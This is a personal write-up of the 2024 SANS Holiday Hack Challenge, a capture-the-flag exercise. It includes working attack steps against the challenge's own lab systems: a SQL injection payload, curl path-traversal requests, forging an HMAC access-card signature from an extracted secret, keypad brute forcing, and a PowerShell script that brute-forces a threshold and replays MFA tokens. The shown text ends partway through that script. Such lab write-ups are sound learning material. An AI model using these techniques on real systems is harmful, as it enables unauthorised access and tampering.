docs.title: Introduction
docs.text:
Welcome to my 2024 SANS and CounterHack's Holiday Hack Challenge (HHC) Write-up. Not only is this going to be my first year trying the Holiday Hack Challenge but it is also my first write-up so hang in there with me. While I made it to the capstone challenges of Act 3, I did not complete those final two challenges. While I plan to complete them after the publication of write-ups, I will not be including the write-up for them here.

The theme of the challenge this year is Snowmaggedon and the challenge is divided into four parts that were released in stages. This was a great format for me personally; while I was unable to publish my write-up on the same schedule, the staged release gave me managable goals for completing the challenges. - Prologue: Frosty's Beach - Front Yard: Act 1 - Front Yard: Act 2 - Front Yard: Act 3

Spoilers

The purpose of this write-up is not to just post the answers publicly but to instead document my solution process. That being said, I will be including each of the answers I obtained. If you are going through the challenges, I highly recommend trying on your own before using another's methods. Happy hunting!

Completion Deadline

The deadline for completing and submitting a write-up for the HHC competition is 03Jan2025. I was unable to complete the write-up in that time so I will be publishing each section as I finish the write-up.

Santa

I thought the holidays were truly lost this year. I am so thankful you were here to right the wrongs of my misguided elves. I will ensure they never jeopardize the holidays again. This is the kind of behavior I expect from Jack Frost and his Trolls, not the elves. But, I suppose I have fault in this as well, since it's the first time I've been away at the start of the season, and after last year's unconventional holidays. Plus, I didn't inform the elves ahead of time. Quite the lesson learned on my part. Even the best of us can always improve. I know each faction had the best interest of the holidays at heart, even if their methods were misguided. It's important to have empathy and forgiveness, especially during the holidays. After all, the greatest gift we give AND receive is time spent with loved ones. Never forget that! Now let's put all this behind us and be merry. Until next year! Happy Holidays!

While I was not able to complete the entire challenge, I got so much further than I ever expected and learned so much. This was an incredible experience that I am gratefull for the opportunity to participate in. I am already looking forward to the next time! Big thanks to all the awesome people over at Counter Hack who made this possible.

Elf Connect Hard

WOW! A high score of 50,000 points! That’s way beyond the limit! With only four rounds and a max of 400 points per round, the top possible score should be 1,600 points. So, how did someone get to 50,000? Something unusual must be happening!

If you're curious, you might want to check under the hood. Sometimes, games hold secrets for those who dig a little deeper. Give it a shot and see what you can discover!

docs.title: Solution (Gold)
docs.text:
As Angel kindly pointed out, the solution to this is accomplished using the browser's developer tools. The dev tools are typically accessed through pressing F12 in a browser, or by right-clicking on a browser page and selecting "Inspect".

Right click and select "Inspect" or press 'F12' on your keyboard to access dev tools

I was not familiar with the use of developer tools prior to this competition but after doing some research, I was able to get a slightly better understanding of the options available. From the dev tools, there are a number of things that are possible. The first thing that I was able to find was the debug panel, from which I was able to view sources and start looking "under the hood" of the application.

The debug panel and sources let me see what was happening

Browser Beware

It's important to note that not all internet browsers will be the same. Some differences will by cosmetic, while others will be more impactful. It is helpful to use the right tool for the job but the things I used for this challenge should work in most browsers. I used Firefox personally.

The source is the document that has the code which represents the application. By examining the source code, it is possible to understand how an application is inteneded to work, among other things. There are different ways to view the source code and interacting with it, but this is where the developer tools console comes in. It was here that I realized my initial mistake of taking the game at face value before exmaining it more in-depth. Scrolling through the code there is, in fact, a few 'scores' values visible just as the hint suggested, right after the answers to the silver challenge.

Right below the answer key, there are fields that show how the high score is set at the start of the game

This looks promising. I had to research ways I could impact this and found out I needed to use another of the developer tools, the console. From the console it is possible to send the backend service information directly, as well as view responses. After playing around with different attempts to make changes, I found the correct method and was able to set my starting score to 50,000 points, matching the highscore, with a simple entry of "score = 50000". With that set, I completed a row of cards for 100 points to bring my score to 50,100 points, triggering the fireworks and beating Random Elf's highscore!

Selecting console allowed me to enter information similar to a command line terminal

Gold!

Answer

Use the browser developer tools to view the source code and send changes to receive more than 50,000 points.

docs.title: Objective
docs.text:
Help Angel Candysalt connect the dots in a game of connections.

Welcome to Elf Connect! This game is based on the popular New York Times 'Connections' game. The game has 4-rounds. For each of the 4 rounds, you are presented with 16 words. Each round is based on a theme. The theme can be further grouped into sub-topics. The theme could be pets, but the groups could be dog breeds, cat breeds, etc. The object of the game is to group words that share a common thread. You receive 100 points for each row you complete. Go for gold and try to beat the high-score.

Angel Candysalt

Welcome back, island adventurer! I'm Angel Candysalt — so happy to finally meet you! I'm thrilled you're here because I could really use a hand with something. Have you ever heard of a game called Connections? It’s simple! All you need to do is find groups of four related words. I've been stuck on it all day, and I'm sure someone as sharp as you will breeze through it. Oh, and while you're at it, check out randomElf's score — they hit fifty thousand points, which seems… oddly suspicious. Think they might have tampered with the game? Just a hunch!

I love brain games! This one is like the New York Times Connections game. Your goal here is to find groups of items that share something in common. docs.title: Solution
docs.text:
This was the first challenge I came across on Frosty's Beach. As with each of the challenges so far, it could be done without any manipulation of the site or code to unlock the Silver trophy. A 'simple' matching game, each level could be solved with OSINT practices or even trial and error if you don't know the correct groupings. The game was four levels each with a 4x4 grid of related tiles laid out in a randomized order. Selecting 3 tiles would highlight each selected tile and selecting the 4th tile would move the group of tiles to the top of the grid, if the selections are correct, until each row has been grouped.

The correct answers are grouped together

Continue making selections until all tiles have been grouped

I played through the game completely the first time, taking time to look up how some of the different levels were related that I was unfamiliar with. After the first level of holdiay themes, levels 2, 3, and 4 were more security focused. Since this is a hacking challenge however, there are more interesting options for arriving at the same result so lets look at the one I found when documenting this challenge. I'll show how I found this particular exploit, as well as some of the source code that explains why this works.

Once all 4 groups have been properly selected the game plays a little fireworks sequence and loads the next level. There are a couple of points to note here: 1. The game can be played from a "terminal" on Frosty's Beach, which opens a pop-up of the game, or it can be opened in a seperate browser window. 2. If played in an independent window, the current level is displayed in the URL: https://hhc24-elfconnect.holidayhackchallenge.com/?round=1

While capturing screenshots for this write up to illustrate the game action when the level completes, I had call to change the round from '2' to '1' which reloaded the page to show the tiles for round 1. I completed the level again, setting up my screenshot to capture the "Round 1 Complete" fireworks.

Round what???

That was interesting. The fireworks screen says "Round 2 Completed". Obviously, I had to investigate further. The URL had changed, showing /?round=3, with the tiles reflecting the same while my score count was showing 800 points, the same amount as completing two levels. I changed the URL to round=1 once again and quickly completed the matches. Sure enough, "Round 3 Complete" with fireworks played before round four tiles loaded.

The URL can be seen showing round 4. The tiles showing are those for Round 4 as well and the score reflects three rounds worth 400 points each having been completed.

So now I'm theoretically on round 4 as the image and URL above shows. Once again, I changed the "round=" element to reflect round 1 to load the first set of tiles. As can be seen below, the points continue to match those showing above, while the URL and tiles match those seen during round 1.

The tiles and URL reflect round 1 while points reflect round 3 completion

I completed the level one more time to trigger the round completetion fireworks:

Success!!!

Silver Elf Connect

Congratulations! You have completed the [Silver] Elf Connect challenge!

That worked! Elf Connect is completed. This unlocks further dialog with Angel Candysalt, the silver trophy, as well as the prompt for how to unlock the Gold trophy.

Angel Candysalt

Amazing! You really connected all the dots like a pro.

Validation

Having already completed the challenge as intended, I wasn't sure if the bug would still trigger the trophy. To confirm, I asked a cohort member to test it using an unused profile. Their test verified that the bug reliably awards the silver trophy.

docs.title: Reflection
docs.text:
Why did that work though? Obviously, that's not "supposed" to happen in a leveling game. You don't want your player receiving the rewards of completing a level when they are replaying the first level over and over.

Looking at the code, we find some interesting things. For one thing, each round's word set is listed. Wordsets

const wordSets = {
    1: ["Tinsel", "Sleigh", "Belafonte", "Bag", "Comet", "Garland", "Jingle Bells", "Mittens", "Vixen", "Gifts", "Star", "Crosby", "White Christmas", "Prancer", "Lights", "Blitzen"],
    2: ["Nmap", "burp", "Frida", "OWASP Zap", "Metasploit", "netcat", "Cycript", "Nikto", "Cobalt Strike", "wfuzz", "Wireshark", "AppMon", "apktool", "HAVOC", "Nessus", "Empire"],
    3: ["AES", "WEP", "Symmetric", "WPA2", "Caesar", "RSA", "Asymmetric", "TKIP", "One-time Pad", "LEAP", "Blowfish", "hash", "hybrid", "Ottendorf", "3DES", "Scytale"],
    4: ["IGMP", "TLS", "Ethernet", "SSL", "HTTP", "IPX", "PPP", "IPSec", "FTP", "SSH", "IP", "IEEE 802.11", "ARP", "SMTP", "ICMP", "DNS"]
    };

We see each round's words listed as an array

We can also see the answer key:

let wordBoxes = [];
let selectedBoxes = [];
let correctSets = [
    [0, 5, 10, 14], // Set 1
    [1, 3, 7, 9],   // Set 2
    [2, 6, 11, 12], // Set 3
    [4, 8, 13, 15]  // Set 4
    ];

Answer key, which could be used to answer each level as well

This shows that each level has the same answer key for each set. As long as the elements submitted as the answer are grouped into the arrays seen here, it doesn't matter what which words are showing on the tiles. This explains why the answers provided after changing the 'rounds=' value are working to advance to the next level. Furthermore, the server recieving the information does not appear to have any checks in place to safeguard against these or account for them.

Checking the code

The hint from Angel for Elf Connect Hard suggest looking at the code, at which point you would likely see the answer key and wordlists as well. If you play the matching game before checking the code, this is a humorous reminder to inspect the code before spending a lot of unnecessary time poking around.

docs.title: Solution
docs.text:
Once again, interpretting the challenge was the first step. I initially took some time assuming that I needed to somehow complete the previous seven steps with just three inputs. I spent some time attempting to chain the various commands together with '&&' or by combining multiple steps together to complete all 7 steps with just 3 inputs. The commands works, but it did not trigger the question resolution or progress to the next prompt.

After banging my head against the challenge for a while, I got frustrated and decided to poke around instead. I started with the command to view the contents of a directory 'ls -la'.

Hmm.. Wonder what that is

Lets open the HARD-MODE.txt with 'cat' and see what we find. 

cat HARD-MODE.txt

HARD-MODE.txt

Prefer to skip ahead without guidance? Use curl to craft a request meeting these requirements:

  • HTTP POST request to https://curlingfun:9090/
  • Parameter "skip" set to "bow"
  • Cookie "end" set to "10"
  • Header "Hack" set to "12ft"

Since I spent so much time trying to do this with the wrong values, I had a pretty good idea of what was needed. We'll start with the basic command that we know from the Silver challenge to ignore certificate verification errors from a self-signed certificate when retrieving a TLS-protected web page: Use -k flag to ignore self-signed errors

curl -k https://curlingfun:9090/
Next "skip" needs to be sent with the value "bow" in the POST body so lets add that with the '-d' flag; Send HTTP POST with a parameter
curl -k -d "skip=bow" https://curlingfun:9090/
Add a cookie named "end" with the value "10" using the flag '-b'; Send a request with a cookie
curl -k -d "skip=bow" -b "end=10" https://curlingfun:9090/
And finally, the header "Hack" needs to be assigned "12ft" using the '-H' flag to create the full command: The full curl command
curl -k -d "skip=bow" -b "end=10" -H "Hack: 12ft" https://curlingfun:9090/
So, after clearing the terminal and sending this command, we get an output with the next request:

Command 1 Output

Excellent! Now, use curl to access this URL: https://curlingfun:9090/../../etc/button

Similar to Silver again, we see a URL with special characters that curl would normally modify. We'll use the flag '--path-as-is' to prevent curl's normal action: Retrieve URL with special characters

curl -k --path-as-is https://curlingfun:9090/../../etc/button

Command 2 Output

Great! Finally, use curl to access the page that this URL redirects to: https://curlingfun:9090/GoodSportsmanship

Here we have a new challenge. We need curl to follow the redirect. If we try accessing the page, we see this:

curl -k https://curlingfun:9090/GoodSportsmanship

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

We can use the '-L' flag to tell curl to follow any redirects and retrieve the final destination page: Follow redirects

curl -k -L https://curlingfun:9090/GoodSportsmanship"

Command 3 Output

Excellent work, you have solved hard mode! You may close this terminal once HHC grants your achievement.

Taking your time

Once again I started making attempts before really exploring my options. Remember, take your time and really understand your environment before assuming the correct solution.

1, 2, 3, Glory!

docs.title: Solution
docs.text:
This challenge taught me much more about the curl function. There are a total of seven prompts for the Silver achievement. I have listed each one and the command required below:

Need help

Running "hint" at any time during this challenge will provide further clues to sovle the challenge.

Question 1

Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host "curlingfun" port 8080.If you need help, run the 'hint' command.

Answer Retrieve the web page on port 8080
curl http://curlingfun:8080

Question 2

Embedded devices often use self-signed certificates, where your browser will not trust the certificate presented. Use curl to retrieve the TLS-protected web page at https://curlingfun:9090/

Answer Retrieve a TLS-protected web page on port 9090 with a self-signed certificate
curl -k https://curlingfun:9090

Question 3

Working with APIs and embedded devices often requires making HTTP POST requests. Use curl to send a request to https://curlingfun:9090/ with the parameter "skip" set to the value "alabaster", declaring Alabaster as the team captain.

Answer Send an HTTP POST request with a parameter
curl -k -d "skip=alabaster" https://curlingfun:9090

Question 4

Working with APIs and embedded devices often requires maintaining session state by passing a cookie. Use curl to send a request to https://curlingfun:9090/ with a cookie called "end" with the value "3", indicating we're on the third end of the curling match.

Answer Send a request with a cookie
curl -k -b "end=3" https://curlingfun:9090

Question 5

Working with APIs and embedded devices sometimes requires working with raw HTTP headers. Use curl to view the HTTP headers returned by a request to https://curlingfun:9090/

Answer View the HTTP headers returned by a request
curl -k -I https://curlingfun:9090

Question 6

Working with APIs and embedded devices sometimes requires working with custom HTTP headers. Use curl to send a request to https://curlingfun:9090/ with an HTTP header called "Stone" and the value "Granite".

Answer Send a request with a custom HTTP header
curl -k -H "Stone: Granite" https://curlingfun:9090

Question 7

curl will modify your URL unless you tell it not to. For example, use curl to retrieve the following URL containing special characters: https://curlingfun:9090/../../etc/hacks

Answer Retrieve a URL with special characters
curl -k --path-as-is https://curlingfun:9090/../../etc/hacks

docs.title: Solution
docs.text:
The conversation with our defecting elf hints at an injection vulnerability. There are a number of ways to use injection, however the first one I learned was an injection when there was a response, which is what we have on the page to search for a drone, so that's where I started.

' OR '1'='1 gives a list of all drones

Starting with the first drone on the list, copy and paste the name to the search field to search for more information.

The Pigeon-Lookalike-v4

The words "true" and "false" are capitalized to emphasize the clue here. Looking at the other pages, we wont find any other .csv to download, so we will have to use what we have. Looking at the ELF-HAWK-dump.csv we do see TRUE and FALSE occuring frequently. I'll skip the tedious hours spent trying to decrypt that clue but eventually, with the help of talking with others in the Discord channel, I was able to determine that "true" and "false" could be binary with "true" equating to "1" and "false" equating to "0". I used Python to create a binary file and interpret as plain text.

drone-binary.py
import csv

# path to CSV file and the output file
csv_file = 'ELF-HAWK-dump.csv'
output_file = 'binary-plain.txt'

# Initialize an empty string to hold the binary result
binary_result = ''

# Open the CSV file and read it
with open(csv_file, mode='r') as file:
    csv_reader = csv.reader(file)
    for row in csv_reader:
        # Loop through each row and check for TRUE or FALSE
        for value in row:
            if value == 'TRUE':
                binary_result += '1'
            elif value == 'FALSE':
                binary_result += '0'

# Convert the binary string to text
# Group the binary into 8-bit chunks (1 byte) for conversion to text
text_result = ''
for i in range(0, len(binary_result), 8):
    byte = binary_result[i:i+8]
    if len(byte) == 8:
        text_result += chr(int(byte, 2))

# Write the plaintext result to a .txt file
with open(output_file, mode='w') as file:
    file.write(text_result)

# Print the result to the terminal
print(text_result)

Tools used

I primarily used VS Code to write and run the scripts I use. Similar to the Silver challenge, I heard of issues with sizing being an issue for some people. While the scipt does print a text file that worked for me, I also printed the output to the terminal of VS Code. If you have issues getting the binary to portray appropriately, consider trying in a different terminal or IDE.

Running the script with our .csv results in ASCII art containing the Gold challenge answer

First thing to do for this challenge is assemble our hint. The provided link gives a python script and after unzipping the shreds.zip from Frosty's Keypad we have a directory named slices with 1000 .jpg files. Make sure that the .py script is in the same directory as the slices directory. When I ran the script, I got notices about not having the necessary packages, specifically numpy and PIL. Use pip install numpy and pip install Pillow if you run into similar errors.

Install the necessary dependencies

Virtual Environment

If you haven't been doing so, it's a good idea to work from a virtual environment. From your working directory, use python3 venv venv then source venv/bin/activate to start your virtual environment before installing the script or dependencies it requires.

Once the dependencies are installed, the script should run without issue and produce a .jpg file

Assembled shreds

It's not a very useful image though, so lets open it with an image manipulator and see if it can be improved. Open the image with most any editing tool and use the orientation tools to flip the image horizontally to get a more easily read image:

This is much more helpful

With the above image we now have some clues for how to proceed with the first part of the challenge; setting up the UART properly.

uart manual

Lots of moving parts for this one

Based on the manual, we have an access card management system (Sanata's Little Helper) and it's interface, the UART. We also have images of important settings for the bridge device. We should make note of the voltage toggle switch, set to 3V in the manual and the PIN header labels: VCC- Voltage TX - Transmit RX - Reveive GND - Ground

Closing the manual, we see four colored cables that can be connected between the bridge and the UART board, plus a USB cable that needs to be connected to the bridge from the terminal. On the UART board we see G, R, T, V next to the pins. Lets assume G = Ground and use the black cable to connect the G pin to the GND pin on the bridge:

Continuing along, use the red cable to connect the V pin to the VCC pin on the bridge.

The other two pins on the bridge are TX for transmitting and RX for receiving. The UART board has corresponding T and R. It may seem sensible to connect TX to T however this would mean both the UART and the bridge are transmitting to each other on the same line. Instead, connect the bridge TX transmit pin to the UART R receiving pin, and the bridge RX receiving pin to the UART T pin.

Check the source

If you take the time to check the source code early on, you would find the pin connections listed as well.

Finally, connect the USB cable to the bridge from the interface and toggle the voltage switch to 3V before selecting the 'Zoom in' option for the interface.

The green Power button can be pressed and after the power on process, the following instructions are seen: Clicking one of the arrows shows us settings that need to be correctly set. Hopefully it looks familiar from the assembled and flipped image from before. Looking at the image we see the first line appears to say BAUD: 115200 and if we scroll through the options on the UART terminal, we will see the same option among those listed. Lets set each variable to match our image.

Everything except the port is provided

With the exception of the correct port, all of our settings should be the same as those provided in the assembled image. Lets assume USB0 is the correct port since that is how we connected to the bridge. When we are ready to test, we can select the S button and receive our success message.

Connections

Hardware Hacking 101 Part 2 - Gold

Create an HMAC signature and modify ID 42 with the new signature.

Jewel Loggins

There’s a tougher route if you're up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature. I know you can do it—come back once you've cracked it!

It's In the Signature

I seem to remember there being a handy HMAC generator included in CyberChef.

docs.title: Solution
docs.text:
If you don't know what HMAC is, like I didn't, it's helplfull to read up on it so you have an idea of what the task involves. Okta.com has a quick read document you can find here to read up on HMAC. The short version is that HMAC, which stands for Hash-Based Message Authentication Codes, is an authentication technique that uses a hash function and a secret key. It is less secure than more modern authentication methods. Lets start learning more about the database we need to modify now. Run the command file access_cards

Now we know SQLite 3 is being used for the access_cards database. Knowing this helps us know or find the correct language and syntax we need to interact with the database. Lets see if we can access SQLite with the command sqlite3.

We're now in the database engine so lets check what is around. Use the command .open access_cards then .schema to view our avaialable tables.

Config looks promissing

Lets see what the config table is holding. select * from config;

Looks like we found what we need

HMAC secret and format! We are on the right track! Make sure to copy this into your notes so you have access to it without having to navigate back here. Once we have that, we need the necessary parts of the "hmac_message_format", i.e. {access}{uuid}. We should be able to get that from the "access_cards" table with the following command: 

SELECT uuid, access FROM access_cards
WHERE id = 42;

Attention to Details

Pay attention to the task here; we are still working with ID 42 to create a custom HMAC.

ID 42's uuid and access. Be sure to copy the UUID for use creating the new HMAC

Access

Your access may be different if you are working on this after having recently completed the Hardware 2 Silver challenge where you changed the access. Regardless of the output, when making the HMAC use the access you want for the account.

Lets put all of this together to create a new HMAC that can be inserted into the access_cards table. Our hint from Morcel mentions CyberChef so we'll head over there and find the HMAC option.

The default settings will need to be adjusted

We have 2 input fields that need information from us, as well as an options dropdown menu that will need to be adjusted. Starting with the input first lets copy and paste the uuid: c06018b6-5e80-4395-ab71-ae5124560189. The config table stated that the HMAC format should be {access}{uuid} so lets add the access we need to the front of the uuid to get 1c06018b6-5e80-4395-ab71-ae5124560189. Next, we'll adjust the recipe by adding the correct key. Again, we get this from the config table where we can see 1|hmac_secret|9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e. Our secret is 9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e so paste that in CyberChef, then change HEX to Latin1 and update the hashing method to SHA256. Select Bake and copy the output 135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096.

Tricky Elves

Be careful not to fall for the elves' subterfuge here. The HMAC secret is also a sha256 hash, which you can see by putting it into something like CrackStation. Change your CyberChef option to Latin1 to prevent issues.

Confirmation

The SLH tool uses a different HMAC secret so we are not able to compare what we get to existing values.

Almost there. All that's left is to modify the database, inserting our HMAC into ID 42's sig column. Back in Santa's Little Helper we'll use SQL language to insert our signature with the following command: 

UPDATE access_cards
SET sig = '135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096'
WHERE id = 42;

After inputting the above command the console returns another Access Granted ASCII art and the Gold badge for Hardware 2!

Glory!

Access Granted

New HMAC signature = 135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096

We'll need a payload to use. In this case, a text file with each possible 5 digit number on a sepearate line. I wrote a python script to create a wordlist. The one here represents a modified version that was adjusted after I did things the hard way.

keypad-list.py
from itertools import permutations

# Known digits from successful password
digits = "72682"

# Generate all unique permutations of the digits
# Permutations inherently avoid duplicates
combinations = [''.join(p) for p in permutations(digits, 5)]

# Filter combinations to ensure each digit is used at least once
valid_combinations = [
    combo for combo in combinations if all(digit in combo for digit in digits)
]

# Write valid combinations to a file
with open("access-code_list.txt", "w") as file:
    file.write("\n".join(valid_combinations))

print(f"Generated {len(valid_combinations)} valid combinations.")

Once Start attack has been clicked, BurpSuite will begin testing each number in your list, sending the packet from our successful access code and changing the payload that was highlighted with each option in the list we provided. You'll be able to watch each number in real time and see the response code that is returned. We are expecting a lot of 400 and looking for 200.

This resulted in a list of 3124 possible combinations. The script above takes those factors into account and produces a much smaller list of 120 possible combinations.

This challenge terminal was a number keypad 0 through 9 with a "Clear" and "Enter" and a "post-it" taped to it. The note taped to the keypad can be selected on to expand it and show 5 groups of numbers; 2:6:1 4:19:3 6:1:1 3:10:4 14:8:3. Based on the conversation with Morcel, there are two access codes that will need to be determined to sovle the challenge.

2:6:1 4:19:3 6:1:1 3:10:4 14:8:3

The conversation further alludes to a book, with the first two hints doing the same. It took some doing but after walking around and behind trees and buildings, I eventually did see an actionable item that allowed me to collect the book. Checking the menu under "Items" we find a new item labeled Frosty Book. The book is a copy of the poem "A Visit from St. Nicholas".

With the book and the taped note in hand, the clue seems pretty clearly to point to a book cipher. This is further validated with the hint: "Who Are You Calling a Dorf?" which is alluding to an Ottendorf cipher. The same was used in the 2004 film National Treasure. Specifically, an Ottendorf Cipher is a type of book cipher that uses three digits. The digits can be used slightly differently, such as Page:Line:Word, Line:Word:Letter, or as we will see here, Page:Word:Letter. Lets open the book and see what the different options provide. The most logical seeming for this scenario is going to be Page:Line:Letter or Page:Word:Letter. The first group of numbers is 2:6:1 so looking at page 2, the sixth line, and the first lettter we have H (Page:Line:Letter) while page 2, the sixth word, and first letter we have S (Page:Word:Letter). The next group is 4:19:3. This helps narrow down our cipher options, as the fouth page only has 10 lines. This means we can rule out the Page:Line:Letter format and proceed with the Page:Word:Letter format; so page 4, 19th word, third letter:

The 19th word and third letter: "A"

At this point we have "S" and "A" with three more letters to go.

Pg 2, Wrd 6, Ltr 1 Pg 4, Wrd 19, Ltr 3 Pg 6, Wrd 1, Ltr 1 Pg 3, Wrd 10, Ltr 4 Pg 14, Wrd 8, Ltr 3 S A N T A

Well, looks like our passcode is S-A-N-T-A which certainly seems to fit the theme so far, but how do we use it if the keypad is only numbers? It was here that late night TV commercials of the late 20th century gave me the edge I needed. The old infomercials of the days before cell phones were filled with companies using clever combinations with the typicall touch tone keypad phone on a landline. Clicking the numbers of the touchpad gives a tone response reminiscient of those days dialing phone numbers.

Touch-Tone keypad

Looking at the image above, we can see that the touch-tone keypad typically starts with the number "2" and have 3 alphabetical characters, with the exception of 7 and 9, which both have 4 characters. Using the access code from our book cipher hint, S-A-N-T-A, we can see the letters correspond to the folowing numbers:

Pg 2, Wrd 6, Ltr 1 Pg 4, Wrd 19, Ltr 3 Pg 6, Wrd 1, Ltr 1 Pg 3, Wrd 10, Ltr 4 Pg 14, Wrd 8, Ltr 3 S A N T A 7 2 6 8 2

Trying 7-2-6-8-2 and "Enter"

Silver

WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis… or was that during the Jack Frost incident? Either way, you're amazing!

docs.text:
Once again, there was some tool set up required before being able to start digging through the application, which makes sense. The challenge used an Android App Bundle format, or .aab. Following the link from the hint Mobile Analysis Hard - Format we can read more about app bundles. The second link from this hint is a github page with instructions on how to convert the .aab to .apk. The instructions on that page are very straightforward so I wont reproduce them here, however, be sure that you are signing the .aab in order to run it in the emulator.

Following the instructions from the apk-sherlock page, convert SantaSwipeSecure.aab to universal.apk and load it to your emulator and view the application list again.

Building the database

Remember that the app needs to be run to create the database. Once the app is loaded, the same adb pull command will be used to pull the database from the emulator

We can then use APKTool to decompile the universal.apk file and open it with VS Code to explore the code again. We know from our conversation with Eve that the database is going to be obfuscated so that will be our focus as we explore the decompiled .apk. If you looked aver the strings documentation then you may recognize the /res directory. Drilling down into /res we can follow the file path from the documentation for strings to view /res/values/strings.xml. Here we find some critical information in the form of the 'ek' and 'iv'.

ek likely means encrypted key while iv likely refers to initialization vector

Copy these values to your notes for later use as they will be needed to run our decryption. This is only part of what we need though. We still need to know how these are used in decryption. Poking around some more we will find in smali/com/northpole/santaswipe/databaseHelper.smali the decryption logic. We will make note of this for later as well. Lets take a look at the encrypted database so we have an idea whet we are working with. The database should have been pulled using the same command that was used for the debug database: adb pull /data/data/com.northpole.santaswipe/databases/naughtynicelist.db. Once again use sqlite3 to start the SQL database and start looking around with .schema.

Maybe we can just decrypt the one deleted entry...

We see an encoded string that is being deleted from the NormalList table and now we have a target for decryption. We have the ek, iv, method, and encrypted data so lets see if we can figure out what it says. We shouldn't need to use the emulator or database any further either since we have our missing child. I used a python script for this part and with the 'missing' name right there in the SCHEMA, there is no need to decrypt the entire database and then visually compare like we did for the silver challenge.

naughtynice-decrypt.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import base64

# Provided values
encryption_key_base64 = "rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw="
iv_base64 = "Q2hlY2tNYXRlcml4"

# Decode the Base64 values
encryption_key = base64.b64decode(encryption_key_base64)
iv = base64.b64decode(iv_base64)

# Encrypted data
encrypted_data_base64 = "KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8="

# Decode the encrypted data
encrypted_data = base64.b64decode(encrypted_data_base64)

# Decrypting the data
cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=iv)
plaintext = cipher.decrypt(encrypted_data) 

# Convert decrypted bytes to string
decrypted_data = plaintext.decode('latin-1')
print("Decrypted Data (Latin-1):", decrypted_data)

Poking around we find some interesting smali files in smali_classes3/. I started in DatabaseHelper.smali and immediately found some helpful clues. We can see that the database used is going to be SQLite.

Now that we have an idea of what we are looking for, we can load the .apk into an emulator then load and run the application to build the database naughtynicelist.db. Access emulator shell

Use the emulator to select the app from the list just like using any Android device.

Emulators and Virtual Environments

An emulator is another type of virtual machine and as such, you are likely to run into complications if you attempt to run an emulator within a virtual machine, or a virtual environment. If this is a problem, there are online emulators such as ApkOnline or appetize.io that can be used. Research the best option for your setup.

PowerShell Admin Access - Fakeout EDR Threshold

They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. docs.title: Solution
docs.text:
This challenge again took a lot of trial and error to determine the goal and how to accomplish it, but eventually I was able to reliably reproduce a successfull script. It involved figuring out the rest of the redacted endpoints, hashing correctly, and writing a script that sent enough attempts to trigger the EDR threshold and brute force through the security features. Much of the script below was modified over and over and doesn't cover the enumeration required to determine the necessary steps as I failed to document my steps as well as I should have during this challenge. While the focus for me was figuring out how to do things from PowerShell, there are a lot of other topics to learn in this challenge as well. MFA or MultiFactor Authentication and the manipulation of cookies, headers, and tokens were all key points of the Gold challenge.

Gold Script
# Define admin credentials explicitly
$username = "admin"
$password = ConvertTo-SecureString "admin" -AsPlainText -Force
$adminCredentials = New-Object System.Management.Automation.PSCredential($username, $password)

# Retrieve tokens from the CSV file
Write-Host "Retrieving tokens from the CSV file"
$url = "http://127.0.0.1:1225/token_overview.csv"
$response = Invoke-WebRequest -Uri $url -Credential $adminCredentials -AllowUnencryptedAuthentication -ErrorAction Stop

if ($response.StatusCode -eq 200 -and $response.Content) {
    Write-Host "Response content received:"
    Write-Host $response.Content
} else {
    Write-Warning "Failed to retrieve valid content from $url. Status code: $($response.StatusCode)"
    return
}

# Process all tokens
Write-Host "Validating all tokens with SHA256 (with newline for hashing)"
$lines = $response.Content -split "`n"

# Remove header and filter out lines that are clearly not tokens
$lines = $lines | Where-Object { $_ -notmatch "file_MD5hash," -and $_ -notmatch "Sha256(file_MD5hash)" -and $_ -notmatch "^# " -and $_ -notmatch "http://127\.0\.0\.1:1225/tokens/" }

foreach ($line in $lines) {
    $token = $line -split ',' | Select-Object -First 1
    $token = $token.Trim()

    if (![string]::IsNullOrWhiteSpace($token)) {
        Write-Host "Processing token: $token"

        try {
            # Append a newline to the token
            $tokenWithNewline = $token + "`n"

            # Compute the SHA256 hash
            $sha256 = [System.Security.Cryptography.SHA256]::Create()
            $hashedBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tokenWithNewline))
            $sha256Hash = [BitConverter]::ToString($hashedBytes) -replace '-'

            Write-Host "Sending token ${token} as a cookie"
            $verificationUrlSHA256 = "http://127.0.0.1:1225/tokens/$sha256Hash"

            $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
            $session.Cookies.Add((New-Object System.Net.Cookie("token", $token, "/", "127.0.0.1")))

            $responseCookie = Invoke-WebRequest -Uri $verificationUrlSHA256 -WebSession $session -Credential $adminCredentials -AllowUnencryptedAuthentication -ErrorAction Stop
            Write-Host "Cookie Validation Response for token ${token}:"
            Write-Host $responseCookie.Content

            # Parse the MFA token from the response
            if ($responseCookie.Content -match "href='(.*?)'") {
                $mfaToken = $matches[1]
                Write-Host "MFA Token: $mfaToken"

                $mfaValidationUrl = "http://127.0.0.1:1225/mfa_validate/$sha256Hash"

                # Add the MFA token to session cookies
                $session.Cookies.Add((New-Object System.Net.Cookie("mfa_token", $mfaToken, "/", "127.0.0.1")))

                # Increment the attempts 11 times to trigger the threshold
                $attemptsCookieValue = "c25ha2VvaWwK01"  # Starting value of attempts cookie
                $base64Part = $attemptsCookieValue.Substring(0, 12)

                for ($i = 1; $i -le 11; $i++) {
                    $counterPart = [int]$attemptsCookieValue.Substring(12)
